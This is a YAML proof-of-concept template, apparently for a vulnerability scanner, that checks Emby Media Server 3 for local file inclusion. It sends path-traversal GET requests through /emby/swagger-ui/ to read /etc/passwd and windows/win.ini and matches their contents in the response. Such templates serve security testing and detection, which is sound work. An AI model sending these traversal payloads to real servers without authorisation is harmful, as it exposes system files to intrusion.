name: poc-yaml-emby-mediaserver-3-lfi
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /emby/swagger-ui/../../../../../../../../../../../../etc/passwd
            follow_redirects: false
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    r1:
        request:
            cache: true
            method: GET
            path: /emby/swagger-ui/../../../../../../../../../../../../windows/win.ini
            follow_redirects: false
        expression: response.status == 200 && "for 16-bit app support".bmatches(response.body)
expression: r0() || r1()
detail:
    author: sharecast
    links:
        - https://www.seebug.org/vuldb/ssvid-96966